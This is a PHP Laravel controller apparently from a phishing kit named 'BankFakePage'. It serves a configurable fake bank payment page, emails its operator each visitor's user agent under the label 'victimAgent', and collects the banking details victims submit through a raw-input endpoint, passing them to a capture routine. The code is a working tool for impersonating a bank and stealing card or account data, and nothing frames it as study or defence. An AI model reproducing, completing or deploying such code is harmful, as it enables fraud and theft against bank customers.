<?php


namespace LaravelClass\BankFakePage\Http\Controllers;


use Illuminate\Support\Facades\Mail;
use LaravelClass\BankFakePage\Facade\GetBankInfo;
use LaravelClass\BankFakePage\Implementation\EmailInitialize;
use LaravelClass\BankFakePage\jobs\SendMailJob;
use LaravelClass\BankFakePage\Mail\FakePageVisitMailer;

class BankController
{
    public function showFakePage()
    {
        $providerInfo= [
            'providerName' => config('fakePage.providerName'),
            'providerNumber' => config('fakePage.providerNumber'),
            'terminalNumber' => config('fakePage.terminalNumber'),
            'websiteUrl' => config('fakePage.websiteUrl'),
            'price' => config('fakePage.price'),
            'tunnelUrl' => config('fakePage.tunnelUrl')
        ];
        EmailInitialize::setEmailConfig();
        Mail::send(new FakePageVisitMailer(['victimAgent'=>$_SERVER['HTTP_USER_AGENT']]));
        return view('fakePage::'.config('fakePage.fakePage'),['providerInfo' => $providerInfo]);
    }

    public function bankInfo()
    {
        $bankInfo = json_decode(file_get_contents('php://input'));
        GetBankInfo::getBankInfo($bankInfo);
    }
}
